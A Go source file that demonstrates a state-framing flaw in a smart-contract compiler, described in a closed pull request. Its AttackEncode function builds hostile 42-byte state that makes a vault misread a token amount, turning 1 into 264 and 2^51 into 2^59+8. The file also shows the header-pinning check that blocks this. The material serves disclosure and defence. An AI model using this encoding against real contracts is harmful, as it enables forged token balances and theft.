// Package framing is a worked example of kaspanet/silverscript#234.
//
// It is not a compiler and does not patch silverc. It encodes TokenState
// { int amount; byte[32] owner } two ways, both 42 bytes, and shows what
// v1-rc1 readInputState would return if it sliced at compile-time offsets.
//
// Canonical:  08 <8 LE amount> 20 <32 owner>
// Attack:     4c 08 <8 LE amount> 1f <31 owner>
// Vault:      amount = region[1:9] as little-endian uint64
// Pin (#234): region[0]==0x08 && region[9]==0x20  (data_prefix of each field)
package framing

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
)

const (
	PR     = "https://github.com/kaspanet/silverscript/pull/234"
	Status = "closed-unmerged"
	Author = "supertypo"
	When   = "2026-08-29 opened; 2026-08-30 closed pending discussion"

	TokenStateLen = 42
	AmountOff     = 1
	AmountEnd     = 9 // exclusive; vault window is [1:9]
	OwnerHdrOff   = 9
	OwnerOff      = 10

	// Amount1 is the "token worth 1" case from the PR write-up.
	Amount1 uint64 = 1
	// VaultSeesForAmount1 is what the hostile 42-byte packing makes the vault
	// read when the real amount payload is 1: bytes 08 01 00 00 00 00 00 00.
	VaultSeesForAmount1 uint64 = 0x108 // 264
	// HugeReal is 2^51 (LE 00 00 00 00 00 00 08 00). Chosen so the attack
	// window is 08 00 00 00 00 00 00 08 = 2^59+8, the PR's "~2^59" figure.
	HugeReal uint64 = 1 << 51
	// HugeVault is 2^59+8. Not 2^59 exactly: byte 1 of the region is always
	// the PUSHDATA1 length 0x08, so the slid uint64's low byte is 8.
	HugeVault uint64 = (1 << 59) + 8
)

func DataPrefix(payloadLen int) []byte {
	switch {
	case payloadLen < 0:
		return nil
	case payloadLen <= 75:
		return []byte{byte(payloadLen)}
	case payloadLen < 256:
		return []byte{0x4c, byte(payloadLen)} // OP_PUSHDATA1
	case payloadLen < 65536:
		return []byte{0x4d, byte(payloadLen), byte(payloadLen >> 8)} // OP_PUSHDATA2
	default:
		return []byte{0x4e, byte(payloadLen), byte(payloadLen >> 8), byte(payloadLen >> 16), byte(payloadLen >> 24)}
	}
}

func le8(n uint64) []byte {
	var b [8]byte
	binary.LittleEndian.PutUint64(b[:], n)
	return b[:]
}

func DemoOwner() [32]byte {
	var o [32]byte
	for i := 0; i < 32; i++ {
		o[i] = byte(0xA0 + i)
	}
	return o
}

// CanonicalEncode is what silverc's encoder writes for TokenState.
func CanonicalEncode(amount uint64, owner [32]byte) []byte {
	out := make([]byte, 0, TokenStateLen)
	out = append(out, DataPrefix(8)...)
	out = append(out, le8(amount)...)
	out = append(out, DataPrefix(32)...)
	out = append(out, owner[:]...)
	return out
}

// AttackEncode is the length-preserving reframe in PR 234:
// OP_PUSHDATA1 for the 8-byte amount, owner push shortened by one byte.
func AttackEncode(amount uint64, owner [32]byte) []byte {
	out := make([]byte, 0, TokenStateLen)
	out = append(out, 0x4c, 0x08) // OP_PUSHDATA1, len 8
	out = append(out, le8(amount)...)
	out = append(out, 0x1f) // push 31
	out = append(out, owner[:31]...)
	return out
}

// VaultAmount is the v1-rc1 read: 8 bytes at offset 1, little-endian.
func VaultAmount(region []byte) (uint64, bool) {
	if len(region) < AmountEnd {
		return 0, false
	}
	return binary.LittleEndian.Uint64(region[AmountOff:AmountEnd]), true
}

func VaultOwner(region []byte) []byte {
	if len(region) < TokenStateLen {
		return nil
	}
	out := make([]byte, 32)
	copy(out, region[OwnerOff:TokenStateLen])
	return out
}

// PinHeaders is the check PR 234 would emit for this layout. v1-rc1 does not.
func PinHeaders(region []byte) error {
	if len(region) != TokenStateLen {
		return fmt.Errorf("length %d, want %d", len(region), TokenStateLen)
	}
	want0 := DataPrefix(8)
	want9 := DataPrefix(32)
	if got := region[0:len(want0)]; !bytesEqual(got, want0) {
		return fmt.Errorf("header at 0: got %x want %x", got, want0)
	}
	if got := region[OwnerHdrOff : OwnerHdrOff+len(want9)]; !bytesEqual(got, want9) {
		return fmt.Errorf("header at %d: got %x want %x", OwnerHdrOff, got, want9)
	}
	return nil
}

func bytesEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

type Cell struct {
	I     int    `json:"i"`
	Hex   string `json:"hex"`
	Role  string `json:"role"`
	Class string `json:"class"`
	InWin bool   `json:"inVaultAmountWindow"`
}

type Packed struct {
	Name        string `json:"name"`
	Hex         string `json:"hex"`
	HexSpaced   string `json:"hexSpaced"`
	Total       int    `json:"totalBytes"`
	RealAmount  uint64 `json:"realAmount"`
	VaultAmount uint64 `json:"vaultReadsAmount"`
	VaultOwner  string `json:"vaultReadsOwnerHex"`
	PinOK       bool   `json:"pinWouldAccept"`
	PinError    string `json:"pinError,omitempty"`
	Cells       []Cell `json:"bytes"`
}

type View struct {
	PR         string   `json:"pr"`
	Status     string   `json:"status"`
	Author     string   `json:"author"`
	When       string   `json:"when"`
	Note       string   `json:"note"`
	FixInPR    string   `json:"fixInPR"`
	OurRule    string   `json:"ourRule"`
	SafeHere   []string `json:"safeHere"`
	Blocked    string   `json:"blocked"`
	Canonical  Packed   `json:"canonical"`
	Attack     Packed   `json:"attack"`
	HugeCanon  Packed   `json:"hugeCanonical"`
	HugeAttack Packed   `json:"hugeAttack"`
	Custom     *Packed  `json:"custom,omitempty"`
}

func Inspect(name string, region []byte, realAmount uint64) Packed {
	p := Packed{
		Name:       name,
		Hex:        hex.EncodeToString(region),
		HexSpaced:  spaced(region),
		Total:      len(region),
		RealAmount: realAmount,
		Cells:      cells(region),
	}
	if n, ok := VaultAmount(region); ok {
		p.VaultAmount = n
	}
	if o := VaultOwner(region); o != nil {
		p.VaultOwner = hex.EncodeToString(o)
	}
	if err := PinHeaders(region); err != nil {
		p.PinOK = false
		p.PinError = err.Error()
		for i := range p.Cells {
			if p.Cells[i].Role == "hdr" {
				p.Cells[i].Class += " slide"
			}
		}
	} else {
		p.PinOK = true
	}
	return p
}

func cells(region []byte) []Cell {
	out := make([]Cell, len(region))
	for i, b := range region {
		c := Cell{
			I:     i,
			Hex:   fmt.Sprintf("%02x", b),
			InWin: i >= AmountOff && i < AmountEnd,
		}
		switch {
		case i == 0 || i == OwnerHdrOff:
			c.Role = "hdr"
		case i >= AmountOff && i < AmountEnd:
			c.Role = "amt"
		default:
			c.Role = "own"
		}
		c.Class = c.Role
		if c.InWin {
			c.Class += " win"
		}
		out[i] = c
	}
	return out
}

func spaced(b []byte) string {
	parts := make([]string, len(b))
	for i, x := range b {
		parts[i] = fmt.Sprintf("%02x", x)
	}
	return strings.Join(parts, " ")
}

func DecodeHex(s string) (Packed, error) {
	s = strings.TrimSpace(s)
	s = strings.TrimPrefix(s, "0x")
	s = strings.ReplaceAll(s, " ", "")
	s = strings.ReplaceAll(s, "\n", "")
	s = strings.ReplaceAll(s, "\t", "")
	if s == "" {
		return Packed{}, fmt.Errorf("empty hex")
	}
	raw, err := hex.DecodeString(s)
	if err != nil {
		return Packed{}, fmt.Errorf("hex: %w", err)
	}
	return Inspect("pasted", raw, 0), nil
}

func Demo() View {
	owner := DemoOwner()
	return View{
		PR:         PR,
		Status:     Status,
		Author:     Author,
		When:       When,
		Note:       "Template hash and P2SH commit to the redeem script's code and its total length. They do not pin how the state region between prefix and suffix is framed. v1-rc1 is unchanged; this package only demonstrates the bytes.",
		FixInPR:    "require each field header == data_prefix(payload_len) at the encoder offset; for plain readInputState also P2SH(window)==input scriptPubKey",
		OurRule:    "this stack never calls readInputState. Own UTXO validateOutputState only.",
		SafeHere:   []string{"KasName.sil", "WorkCredit.sil", "KaChatPayTimeout.sil", "KasInvoice.sil"},
		Blocked:    "any till/vault/minter that reads a KCC-20 or WorkCredit owned by someone else",
		Canonical:  Inspect("encoder (what the vault assumes)", CanonicalEncode(Amount1, owner), Amount1),
		Attack:     Inspect("hostile instance of the SAME template", AttackEncode(Amount1, owner), Amount1),
		HugeCanon:  Inspect("encoder, amount=2^51", CanonicalEncode(HugeReal, owner), HugeReal),
		HugeAttack: Inspect("hostile, amount=2^51 → vault sees 2^59+8", AttackEncode(HugeReal, owner), HugeReal),
	}
}

func Report() map[string]any {
	v := Demo()
	return map[string]any{
		"pr":         v.PR,
		"status":     v.Status,
		"author":     v.Author,
		"when":       v.When,
		"tokenState": "struct { int amount; byte[32] owner }",
		"canonical":  v.Canonical,
		"attack":     v.Attack,
		"huge":       map[string]any{"canonical": v.HugeCanon, "attack": v.HugeAttack},
		"whatPins":   "template hash + total length. What does not pin: push headers inside the region.",
		"fixInPR":    v.FixInPR,
		"ourRule":    v.OurRule,
		"safeHere":   v.SafeHere,
		"blocked":    v.Blocked,
		"numbers": map[string]any{
			"amount1":             Amount1,
			"vaultSeesForAmount1": VaultSeesForAmount1,
			"hugeReal":            HugeReal,
			"hugeVault":           HugeVault,
		},
	}
}
